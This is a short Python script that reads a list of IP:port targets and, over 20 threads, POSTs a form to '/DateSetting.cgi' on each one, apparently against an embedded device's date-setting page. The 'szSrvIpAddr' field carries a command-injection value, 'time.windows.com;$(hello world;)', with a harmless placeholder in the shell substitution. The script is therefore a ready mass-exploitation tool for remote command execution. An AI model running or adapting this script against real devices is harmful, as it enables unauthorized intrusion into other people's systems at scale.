import requests
import concurrent.futures

# Configuration
INPUT_FILE = '0601.txt'
TARGET_PATH = '/DateSetting.cgi'
TIMEOUT = 5  # Timeout in seconds to prevent hanging
MAX_THREADS = 20  # Number of concurrent threads

# POST request payload
PAYLOAD = {
    'dwTimeZone': '2',
    'dwGainType': '0',
    'szSrvIpAddr': 'time.windows.com;$(hello world;)',
    'NTP_Update_time_hh': '5',
    'NTP_Update_time_mm': '10',
    'szDateM': '2024/08/07',
    'szTimeM': '14:25:16',
    'bDateFomat': '0',
    'bDateFormatMisc': '0',
    'dwIsDelay': '1',
    'Montype': '0',
    'submit': 'Apply'
}

def send_request(ip_port):
    """Sends a POST request to the specified IP:PORT."""
    url = f"http://{ip_port.strip()}{TARGET_PATH}"
    try:
        response = requests.post(url, data=PAYLOAD, timeout=TIMEOUT)
        return f"[SUCCESS] {url} - Status Code: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"[FAILED] {url} - Error: {e}"

def main():
    # Read the target list from ip.txt
    try:
        with open(INPUT_FILE, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: The file '{INPUT_FILE}' was not found.")
        return

    print(f"Starting process. Total targets: {len(targets)}")
    
    # Execute requests using a thread pool
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        results = list(executor.map(send_request, targets))

    # Print results
    for result in results:
        print(result)

if __name__ == "__main__":
    main()
